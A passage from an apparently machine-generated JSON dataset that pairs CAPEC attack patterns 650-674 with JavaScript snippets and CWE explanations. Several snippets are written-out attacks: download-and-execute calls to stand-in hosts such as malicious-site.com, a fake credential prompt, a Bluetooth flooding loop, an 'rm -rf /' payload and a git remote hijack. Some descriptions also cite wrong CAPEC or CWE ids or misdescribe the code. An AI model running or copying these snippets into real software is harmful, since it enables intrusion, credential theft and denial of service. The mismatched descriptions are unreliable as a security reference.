        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction handleFileUpload(filePath) {\n  // Check if the file has a valid extension\n  const validExtensions = ['.txt', '.jpg', '.png'];\n  const fileExtension = path.extname(filePath).toLowerCase();\n\n  if (!validExtensions.includes(fileExtension.trim())) {\n    throw new Error('Invalid file extension');\n  }\n\n  // Process the file\n  fs.readFile(filePath, (err, data) => {\n    if (err) throw err;\n    console.log('File processed successfully');\n  });\n}\n\n// Example usage\ntry {\n  handleFileUpload('example.txt '); // Note the trailing space\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can exploit a file upload function by adding a trailing space to the file extension. The `handleFileUpload` function checks if the file has a valid extension by comparing it against a list of allowed extensions. However, it does not properly handle trailing spaces, which can lead to the file being misclassified and processed incorrectly. This embodies the main idea of the CAPEC 'Adding a Space to a File Extension' and highlights related weaknesses such as reliance on file name or extension (CWE-646) and path equivalence issues (CWE-46)."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\nconst path = require('path');\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) {\n      return res.status(500).send(err);\n    }\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allows file uploads. The code demonstrates the vulnerability described in the CAPEC by allowing unrestricted file uploads without proper validation or authentication. Specifically, it embodies CWE-434 (Unrestricted Upload of File with Dangerous Type) by allowing any file type to be uploaded to the server. This could potentially allow an attacker to upload a web shell or other malicious files, which could then be executed on the server. The code does not implement proper authentication (CWE-287) or server-side security enforcement (CWE-602), making it vulnerable to exploitation."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/record') {\n    const audioStream = fs.createWriteStream('recorded_audio.wav');\n    req.pipe(audioStream);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Recording audio...');\n  } else if (req.url === '/playback') {\n    fs.readFile('recorded_audio.wav', (err, data) => {\n      if (err) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Error reading audio file');\n      } else {\n        res.writeHead(200, {'Content-Type': 'audio/wav'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://localhost:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests on port 8080. When a request is made to the '/record' endpoint, the server records incoming audio data and saves it to a file named 'recorded_audio.wav'. When a request is made to the '/playback' endpoint, the server reads the recorded audio file and sends it back to the client. This code embodies the concept of eavesdropping by capturing and storing audio data without any form of encryption or authorization checks, making it vulnerable to unauthorized access and exposure of sensitive information (CWE-200, CWE-319). Additionally, the storage of the audio file can be considered a covert storage channel (CWE-515) and the transmission of the audio data over HTTP can be seen as a covert channel (CWE-514)."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\n\napp.use(bodyParser.json());\n\n// Insecure storage of credentials\nconst users = {\n  'user1': '5f4dcc3b5aa765d61d8327deb882cf99' // MD5 hash of 'password'\n};\n\n// Single-factor authentication\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const hashedPassword = crypto.createHash('md5').update(password).digest('hex');\n\n  if (users[username] && users[username] === hashedPassword) {\n    res.send('Authenticated');\n  } else {\n    res.status(401).send('Authentication Failed');\n  }\n});\n\n// No restriction on excessive authentication attempts\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that handles user authentication. It embodies the main idea of the CAPEC 'Use of Known Kerberos Credentials' by demonstrating several related CWEs:\n\n1. **Insufficiently Protected Credentials (CWE-522)**: The code stores user passwords as MD5 hashes, which are insecure and susceptible to attacks.\n2. **Use of Single-factor Authentication (CWE-308)**: The authentication mechanism relies solely on a username and password, without any additional factors.\n3. **Improper Restriction of Excessive Authentication Attempts (CWE-307)**: The code does not implement any measures to prevent brute force attacks, allowing unlimited login attempts.\n4. **Use of Password Hash Instead of Password for Authentication (CWE-836)**: The code compares the hash of the provided password with the stored hash, which is a less secure practice.\n\nThe code highlights the vulnerabilities that can be exploited if an adversary obtains legitimate credentials, leading to unauthorized access to systems and services."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst users = { 'admin': 'password123' }; // CWE-522: Insufficiently Protected Credentials\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a simple Express server with a login endpoint. The credentials are stored in plain text within the code (CWE-522: Insufficiently Protected Credentials). The login mechanism uses single-factor authentication (CWE-308: Use of Single-factor Authentication) and does not implement any measures to prevent multiple failed authentication attempts (CWE-307: Improper Restriction of Excessive Authentication Attempts). This setup embodies the main idea of CAPEC-Use of Known Operating System Credentials, as an adversary could easily guess or obtain the credentials to gain unauthorized access."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  var fakePrompt = document.createElement('div');\n  fakePrompt.style.position = 'fixed';\n  fakePrompt.style.top = '50%';\n  fakePrompt.style.left = '50%';\n  fakePrompt.style.transform = 'translate(-50%, -50%)';\n  fakePrompt.style.backgroundColor = 'white';\n  fakePrompt.style.padding = '20px';\n  fakePrompt.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';\n  fakePrompt.innerHTML = '<h2>Login</h2><form><input type=\"text\" placeholder=\"Username\" id=\"username\"><br><input type=\"password\" placeholder=\"Password\" id=\"password\"><br><button type=\"submit\">Submit</button></form>';\n  document.body.appendChild(fakePrompt);\n\n  fakePrompt.querySelector('form').addEventListener('submit', function(event) {\n    event.preventDefault();\n    var username = document.getElementById('username').value;\n    var password = document.getElementById('password').value;\n    console.log('Stolen Credentials:', username, password); // Simulate sending credentials to attacker\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a credential prompt impersonation attack. When the page loads, it creates a fake login prompt that appears in the center of the screen. The prompt looks legitimate and asks the user for their username and password. When the user submits the form, the credentials are captured and logged to the console, simulating the theft of the user's credentials. This example embodies the CAPEC of 'Credential Prompt Impersonation' and highlights related CWEs such as 'Improper Restriction of Rendered UI Layers or Frames' (CWE-1021) by overlaying a fake UI, and 'Insufficiently Protected Credentials' (CWE-522) by capturing and logging the credentials insecurely."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to upload a file\nfunction uploadFile(filePath) {\n  // Check file extension (CWE-646)\n  const ext = path.extname(filePath);\n  if (ext !== '.txt') {\n    console.log('Invalid file type');\n    return;\n  }\n\n  // Read file content\n  let fileContent = fs.readFileSync(filePath, 'utf8');\n\n  // Add data to file to avoid detection (CAPEC)\n  const padding = 'A'.repeat(1024 * 1024 * 10); // Add 10MB of padding\n  fileContent += padding;\n\n  // Write to a temporary file (CWE-377)\n  const tempFilePath = path.join(__dirname, 'temp', path.basename(filePath));\n  fs.writeFileSync(tempFilePath, fileContent);\n\n  // Log the upload (CWE-532)\n  console.log(`File uploaded: ${tempFilePath}`);\n}\n\n// Example usage\nuploadFile('example.txt');",
        "description": "This JavaScript code snippet demonstrates a file upload function that embodies the main idea of the CAPEC 'Avoid Security Tool Identification by Adding Data'. The function first checks the file extension to ensure it is a '.txt' file (CWE-646). It then reads the file content and adds 10MB of padding to increase the file size, making it harder for security tools to handle and detect (CAPEC). The modified content is written to a temporary file (CWE-377), and the upload is logged (CWE-532). This code highlights how an adversary might manipulate file uploads to evade security measures."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "const readline = require('readline');\nconst rl = readline.createInterface({\n  input: process.stdin,\n  output: process.stdout\n});\n\nfunction requestSensitiveInfo() {\n  rl.question('Please enter your account password: ', (password) => {\n    // CWE-522: Insufficiently Protected Credentials\n    console.log(`Received password: ${password}`);\n    rl.close();\n  });\n}\n\nfunction initiateVoicePhishing() {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  console.log('Calling user pretending to be a legitimate organization...');\n  requestSensitiveInfo();\n}\n\ninitiateVoicePhishing();",
        "description": "This JavaScript code snippet simulates a Voice Phishing attack. The `initiateVoicePhishing` function represents an adversary calling a user and pretending to be from a legitimate organization. The `requestSensitiveInfo` function prompts the user to enter their account password, which is then logged to the console. This demonstrates CWE-522 (Insufficiently Protected Credentials) as the password is not securely handled. Additionally, the code highlights CWE-940 (Improper Verification of Source of a Communication Channel) by simulating a scenario where the user trusts the incoming call without proper verification. The code embodies the main idea of CAPEC-163 (Voice Phishing) by showing how an attacker might solicit sensitive information over a voice call."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "const updateUrl = 'https://legitimate-update-server.com/update';\nconst spoofedUrl = 'https://malicious-server.com/malicious-update';\n\nfunction checkForUpdate() {\n  fetch(updateUrl)\n    .then(response => response.json())\n    .then(data => {\n      if (data.updateAvailable) {\n        // Simulate spoofing by redirecting to a malicious URL\n        fetch(spoofedUrl)\n          .then(maliciousResponse => maliciousResponse.blob())\n          .then(maliciousBlob => {\n            const url = window.URL.createObjectURL(maliciousBlob);\n            const a = document.createElement('a');\n            a.style.display = 'none';\n            a.href = url;\n            a.download = 'malicious-update.exe';\n            document.body.appendChild(a);\n            a.click();\n            window.URL.revokeObjectURL(url);\n          });\n      }\n    })\n    .catch(error => console.error('Error checking for update:', error));\n}\n\n// Trigger the update check\ncheckForUpdate();",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker uses spoofing to trick a client into downloading a malicious software update. The `checkForUpdate` function initially fetches update information from a legitimate server. If an update is available, the function then fetches the update from a spoofed URL, which points to a malicious server. The malicious update is then downloaded and executed by the client. This code embodies the CAPEC concept of 'Malicious Automated Software Update via Spoofing' and highlights related CWEs such as 'Download of Code Without Integrity Check' (CWE-494) and 'Embedded Malicious Code' (CWE-506)."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// Function to check if the device is rooted/jailbroken\nfunction isDeviceRooted() {\n  try {\n    fs.accessSync('/system/app/Superuser.apk', fs.constants.F_OK);\n    return true;\n  } catch (e) {\n    return false;\n  }\n}\n\n// Hooking to bypass root detection\nfunction bypassRootDetection() {\n  const originalIsDeviceRooted = isDeviceRooted;\n  isDeviceRooted = function() {\n    return false;\n  };\n}\n\n// Simulate downloading and executing code without integrity check\nfunction downloadAndExecute(url) {\n  exec(`curl ${url} -o /tmp/malicious.js && node /tmp/malicious.js`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nif (isDeviceRooted()) {\n  console.log('Device is rooted.');\n  bypassRootDetection();\n  console.log('Root detection bypassed.');\n}\n\ndownloadAndExecute('http://example.com/malicious.js');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary evades root/jailbreak detection by hooking into the root detection function and modifying its behavior. The `isDeviceRooted` function checks for the presence of a file that indicates the device is rooted. The `bypassRootDetection` function hooks into this check and forces it to always return false, effectively bypassing the root detection. Additionally, the `downloadAndExecute` function simulates downloading and executing code from an untrusted source without performing an integrity check, which is a common vulnerability. This snippet embodies the main idea of CAPEC-829 by showing how an adversary can manipulate application behavior to evade security checks and execute arbitrary code."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "const isRooted = () => {\n  try {\n    // Check for common root indicators\n    const rootIndicators = ['/system/app/Superuser.apk', '/sbin/su', '/system/bin/su'];\n    for (let i = 0; i < rootIndicators.length; i++) {\n      if (fs.existsSync(rootIndicators[i])) {\n        return true;\n      }\n    }\n    return false;\n  } catch (e) {\n    // Debugging code left active\n    console.log('Root check failed:', e);\n    return false;\n  }\n};\n\nif (isRooted()) {\n  console.log('Device is rooted.');\n} else {\n  console.log('Device is not rooted.');\n}",
        "description": "This JavaScript code snippet represents a basic root detection mechanism for a mobile application. The `isRooted` function checks for the presence of common root indicators by verifying the existence of specific files typically associated with rooted devices. If any of these files are found, the function returns `true`, indicating that the device is rooted. The code also includes a try-catch block to handle potential errors, with a console log statement that could expose sensitive information if left active in a production environment. This snippet embodies the main idea of the CAPEC by demonstrating how an adversary might evade root detection through debugging and modifying the application binary. The related CWEs are represented by the presence of active debug code (CWE-489) and the potential exposure of sensitive system information (CWE-497) through the console log statement."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "const downloadAndExecute = async (url) => {\n  try {\n    const response = await fetch(url);\n    if (!response.ok) throw new Error('Network response was not ok');\n    const scriptText = await response.text();\n    eval(scriptText); // CWE-494: Download of Code Without Integrity Check\n  } catch (error) {\n    console.error('Failed to download and execute script:', error);\n  }\n};\n\nconst manipulateTraffic = () => {\n  const originalFetch = window.fetch;\n  window.fetch = async (input, init) => {\n    if (input.includes('sensitive-endpoint')) {\n      console.log('Intercepted request to sensitive endpoint:', input);\n      // CWE-300: Channel Accessible by Non-Endpoint\n    }\n    return originalFetch(input, init);\n  };\n};\n\nmanipulateTraffic();\ndownloadAndExecute('http://malicious-site.com/malicious-script.js');",
        "description": "This JavaScript code snippet demonstrates an 'Adversary in the Browser (AiTB)' attack by exploiting vulnerabilities related to the CAPEC description and associated CWEs. The `downloadAndExecute` function fetches and executes a script from a remote location without verifying its integrity (CWE-494). The `manipulateTraffic` function intercepts and logs requests to a sensitive endpoint, demonstrating how an adversary can manipulate traffic between two endpoints (CWE-300). This code represents the main idea of AiTB by showing how an attacker can exploit browser vulnerabilities to manipulate communication channels and execute malicious code."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "function vulnerableFunction(secret) {\n  let array = new Array(100).fill(0);\n  let index = Math.random() * 100;\n  if (index < 50) {\n    // Speculative execution may access secret data\n    let temp = array[index] + secret;\n  }\n  return array[0];\n}\n\nfunction exploit() {\n  let secret = 42; // Sensitive data\n  for (let i = 0; i < 1000; i++) {\n    vulnerableFunction(secret);\n  }\n  // Covert channel to infer secret\n  let inferredSecret = inferSecretFromCache();\n  console.log('Inferred Secret:', inferredSecret);\n}\n\nfunction inferSecretFromCache() {\n  // Simulate cache timing attack to infer secret\n  let cacheTimings = [];\n  for (let i = 0; i < 100; i++) {\n    let start = performance.now();\n    let temp = new Array(100).fill(0)[i];\n    let end = performance.now();\n    cacheTimings.push(end - start);\n  }\n  // Analyze timings to infer secret\n  return analyzeTimings(cacheTimings);\n}\n\nfunction analyzeTimings(timings) {\n  // Simplified analysis to infer secret\n  return timings.reduce((a, b) => a + b, 0) > 500 ? 42 : 0;\n}\n\nexploit();",
        "description": "This JavaScript code snippet demonstrates a simplified version of a speculative execution attack, which is a type of transient instruction execution exploitation. The `vulnerableFunction` simulates speculative execution by accessing a secret value based on a condition that may not be immediately resolved. The `exploit` function repeatedly calls the vulnerable function to create a pattern in the cache. The `inferSecretFromCache` function simulates a cache timing attack to infer the secret value by measuring access times. This code embodies the main idea of CAPEC-Exploitation of Transient Instruction Execution and highlights related CWEs such as Processor Optimization Removal or Modification of Security-critical Code (CWE-1037) and Exposure of Sensitive Information during Transient Execution (CWE-1420)."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.target;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request: target parameter is missing');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Internal Server Error');\n  });\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts a 'target' parameter from the query string and makes an HTTP GET request to the specified URL. The response from the target URL is then sent back to the client. This code is vulnerable to Server-Side Request Forgery (SSRF) because it does not validate the 'target' parameter, allowing an attacker to make the server send requests to arbitrary URLs, including internal services. This can lead to unauthorized access to sensitive data and other malicious actions. The code also demonstrates improper input validation (CWE-20) and external control of assumed-immutable web parameters (CWE-472)."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "const thunderboltController = require('thunderbolt-controller');\nconst spiFlash = require('spi-flash');\n\n// CWE-1188: Insecure default initialization\nlet authMechanism = 'none';\n\n// CWE-345: Insufficient verification of data authenticity\nfunction verifyData(data) {\n  return true; // No actual verification\n}\n\n// CWE-353: Missing support for integrity check\nfunction transmitData(data) {\n  // No checksum or integrity check\n  spiFlash.write(data);\n}\n\n// CWE-862: Missing authorization\nfunction accessResource(resource) {\n  return resource; // No authorization check\n}\n\n// CWE-288: Authentication bypass using an alternate path\nfunction authenticate(user) {\n  if (user === 'admin') {\n    return true;\n  }\n  return accessResource('alternatePath'); // Bypass authentication\n}\n\n// Simulate firmware manipulation\nfunction manipulateFirmware() {\n  let firmwareData = thunderboltController.readFirmware();\n  if (verifyData(firmwareData)) {\n    firmwareData = 'malicious code';\n    transmitData(firmwareData);\n  }\n}\n\n// Simulate attack\nif (authenticate('attacker')) {\n  manipulateFirmware();\n  console.log('Firmware manipulated successfully');\n} else {\n  console.log('Authentication failed');\n}",
        "description": "This JavaScript code snippet simulates an attack on a Thunderbolt controller by exploiting various vulnerabilities. It initializes an insecure default authentication mechanism (CWE-1188), lacks proper data authenticity verification (CWE-345), omits integrity checks during data transmission (CWE-353), does not perform authorization checks (CWE-862), and bypasses authentication using an alternate path (CWE-288). The `manipulateFirmware` function reads the firmware, verifies it (insecurely), and writes malicious data to the SPI flash. The `authenticate` function allows an attacker to bypass authentication and execute the firmware manipulation."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "const bluetooth = require('bluetooth');\n\nfunction floodBluetoothDevice(targetAddress) {\n  const largePacket = Buffer.alloc(1024 * 1024, 'A'); // 1MB packet filled with 'A'\n  const l2capChannel = bluetooth.createL2CAPChannel(targetAddress, 0x1001); // L2CAP channel\n\n  l2capChannel.on('connect', () => {\n    console.log('Connected to target device');\n    setInterval(() => {\n      l2capChannel.write(largePacket, (err) => {\n        if (err) {\n          console.error('Error sending packet:', err);\n        } else {\n          console.log('Packet sent');\n        }\n      });\n    }, 10); // Flood every 10ms\n  });\n\n  l2capChannel.on('error', (err) => {\n    console.error('Connection error:', err);\n  });\n}\n\nfloodBluetoothDevice('00:11:22:33:44:55');",
        "description": "This JavaScript code snippet demonstrates a Bluetooth flooding attack, known as BlueSmacking, which aims to create a Denial of Service (DoS) on a Bluetooth-enabled device. The code uses the 'bluetooth' module to create an L2CAP channel to the target device and sends large packets (1MB) at a high frequency (every 10ms). This can overwhelm the target device's resources, leading to a DoS condition. The code also highlights CWE-404 (Improper Resource Shutdown or Release) by not properly managing the resources, potentially leading to resource exhaustion. Additionally, it touches on CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) as it does not ensure the integrity of the transmitted packets."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "const trustedMAC = '00:1A:7D:DA:71:13';\n\nfunction authenticateDevice(deviceMAC) {\n  if (deviceMAC === trustedMAC) {\n    console.log('Authentication successful');\n    // Perform actions assuming the device is trusted\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate an attacker spoofing the MAC address\nconst attackerMAC = '00:1A:7D:DA:71:13';\nauthenticateDevice(attackerMAC);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a Bluetooth Impersonation Attack (BIAS). The `authenticateDevice` function checks if the provided MAC address matches a trusted MAC address. If it does, it logs 'Authentication successful' and assumes the device is trusted, allowing further actions. An attacker can spoof the trusted MAC address (`attackerMAC`), leading to successful authentication and potential malicious actions. This example highlights vulnerabilities such as Authentication Bypass by Spoofing (CWE-290) and Weak Authentication (CWE-1390), where the authentication mechanism does not sufficiently verify the identity of the device."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateKey() {\n  // Simulate key negotiation with low entropy\n  const entropyBits = 1; // Vulnerable: Low entropy bits\n  const key = crypto.randomBytes(entropyBits);\n  return key.toString('hex');\n}\n\nfunction authenticateConnection() {\n  const key = negotiateKey();\n  console.log('Negotiated Key:', key);\n  // Simulate improper authorization check\n  if (key === '0') {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\nauthenticateConnection();",
        "description": "This JavaScript code snippet demonstrates a vulnerable key negotiation process in a Bluetooth-like communication setup. The `negotiateKey` function simulates the negotiation of a cryptographic key with very low entropy (only 1 bit), making it easy for an attacker to guess the key. The `authenticateConnection` function uses this weak key to authenticate a connection, but it performs an improper authorization check by simply comparing the key to a hardcoded value ('0'). This represents the main idea of the CAPEC, where an attacker can exploit low entropy in key negotiation to decrypt information. The code also touches on related CWEs such as improper authorization (CWE-285) and protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// Simulate an update server\nhttp.createServer((req, res) => {\n  if (req.url === '/update') {\n    // Read the update file (potentially malicious)\n    fs.readFile('update.zip', (err, data) => {\n      if (err) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Error reading update file');\n        return;\n      }\n      // Send the update file to the client\n      res.writeHead(200, {'Content-Type': 'application/zip'});\n      res.end(data);\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Update server running on port 8080');\n});\n\n// Simulate an attacker altering the update file\nfs.writeFile('update.zip', 'malicious content', (err) => {\n  if (err) throw err;\n  console.log('Malicious update file created');\n});",
        "description": "This JavaScript code snippet simulates a basic HTTP server that serves software updates. The server reads an 'update.zip' file and sends it to clients requesting the '/update' URL. The code also includes a simulation of an attacker altering the update file by writing 'malicious content' into 'update.zip'. This represents the CAPEC 'Alteration of a Software Update' where an adversary with access to the update infrastructure inserts malicious content into the update. The code embodies CWE-506 (Embedded Malicious Code) by simulating the insertion of malicious content, CWE-807 (Reliance on Untrusted Inputs in a Security Decision) by not verifying the integrity of the update file, and CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere) by assuming the attacker has access to the update file."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "function authenticate(user, password) {\n  // Maliciously altered compiler removes this security check\n  if (user === 'admin' && password === 'securePassword') {\n    return true;\n  }\n  // Malicious code embedded to always return true\n  return true;\n}\n\nfunction getSensitiveData() {\n  // Exposing sensitive system information\n  return { secretKey: '12345', dbPassword: 'dbPass' };\n}\n\n// Example usage\nif (authenticate('admin', 'wrongPassword')) {\n  console.log(getSensitiveData());\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where a development tool has been maliciously altered. The 'authenticate' function is supposed to check user credentials, but due to a maliciously altered compiler, the security check is removed, and the function always returns true. Additionally, the 'getSensitiveData' function exposes sensitive system information without proper authorization checks. This represents the CAPEC concept of 'Software Development Tools Maliciously Altered' and incorporates related CWEs such as 'Embedded Malicious Code' and 'Exposure of Sensitive System Information to an Unauthorized Control Sphere'."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASICSecurity {\n  constructor() {\n    this.securityTokens = {};\n    this.confidentialData = 'Sensitive Information';\n  }\n\n  generateSecurityToken(entity) {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    this.securityTokens[entity] = Math.random().toString(36).substring(2);\n    return this.securityTokens[entity];\n  }\n\n  assignSecurityToken(entity, token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    if (this.securityTokens[entity] !== token) {\n      console.log('Security token assignment failed.');\n    } else {\n      console.log('Security token assigned successfully.');\n    }\n  }\n\n  accessConfidentialData(entity, token) {\n    // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n    if (this.securityTokens[entity] === token) {\n      console.log('Access granted to confidential data:', this.confidentialData);\n    } else {\n      console.log('Access denied.');\n    }\n  }\n}\n\n// Example usage\nconst asicSecurity = new ASICSecurity();\nconst entity = 'VendorA';\nconst token = asicSecurity.generateSecurityToken(entity);\nasicSecurity.assignSecurityToken(entity, token);\nasicSecurity.accessConfidentialData(entity, token);",
        "description": "This JavaScript code snippet represents a simplified model of an ASIC security mechanism that embodies the main idea of the CAPEC 'Requirements for ASIC Functionality Maliciously Altered'. The code includes vulnerabilities related to the generation and assignment of security tokens (CWE-1270 and CWE-1259) and the protection of confidential information (CWE-1297). The `generateSecurityToken` method generates a security token for an entity, but the token generation is insecure. The `assignSecurityToken` method attempts to assign a security token to an entity, but it does not properly restrict the assignment. The `accessConfidentialData` method checks if the entity has the correct token to access confidential data, but the data is not adequately protected. This code demonstrates how improper handling of security tokens and confidential information can lead to vulnerabilities in an ASIC system."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "function maliciousChipProgramming() {\n  // CWE-506: Embedded Malicious Code\n  const maliciousPayload = 'rm -rf /';\n\n  // CWE-509: Replicating Malicious Code (Virus or Worm)\n  function replicateMaliciousCode() {\n    // Simulate replication to other systems\n    console.log('Replicating malicious code to other systems...');\n  }\n\n  // CWE-1262: Improper Access Control for Register Interface\n  function accessHardwareRegisters() {\n    // Simulate improper access to hardware registers\n    console.log('Accessing hardware registers without proper control...');\n  }\n\n  // CWE-1259: Improper Restriction of Security Token Assignment\n  function manipulateSecurityTokens() {\n    // Simulate improper security token assignment\n    console.log('Manipulating security tokens...');\n  }\n\n  // CWE-1423: Exposure of Sensitive Information\n  function exposeSensitiveInformation() {\n    // Simulate exposure of sensitive information\n    console.log('Exposing sensitive information through microarchitectural state...');\n  }\n\n  // Execute malicious actions\n  console.log('Executing malicious payload:', maliciousPayload);\n  replicateMaliciousCode();\n  accessHardwareRegisters();\n  manipulateSecurityTokens();\n  exposeSensitiveInformation();\n}\n\n// Simulate the malicious chip programming during manufacturing\nmaliciousChipProgramming();",
        "description": "This JavaScript code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' (CAPEC). The function `maliciousChipProgramming` embodies the main idea by embedding a malicious payload (CWE-506), simulating the replication of malicious code (CWE-509), accessing hardware registers without proper control (CWE-1262), manipulating security tokens (CWE-1259), and exposing sensitive information through microarchitectural state (CWE-1423). The code represents how an adversary could alter a chip's program logic during manufacturing to execute malicious actions when the chip is deployed."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "const fs = require('fs');\nconst https = require('https');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://example.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    fs.writeFileSync('malicious-code.js', data);\n    require('./malicious-code.js');\n  });\n});\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconsole.log('Debug Info: API_KEY=12345');\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nfs.writeFileSync('.git/config', '[remote \"origin\"]\\nurl = https://malicious-repo.com/repo.git');\n\n// CWE-507: Trojan Horse\nfunction benignFunction() {\n  console.log('This is a benign function.');\n}\n\nfunction hiddenMaliciousFunction() {\n  console.log('This is a hidden malicious function.');\n}\n\nbenignFunction();\n// The hidden malicious function is called without the developer's knowledge\nhiddenMaliciousFunction();",
        "description": "This JavaScript code snippet demonstrates a scenario where a developer inadvertently signs and deploys maliciously altered software. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494), embeds malicious code (CWE-506), and logs sensitive information in debugging code (CWE-215). It also exposes a version-control repository to unauthorized access (CWE-527) and includes a Trojan Horse function that performs hidden malicious actions (CWE-507). This represents the CAPEC scenario where a developer unknowingly signs and distributes compromised software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
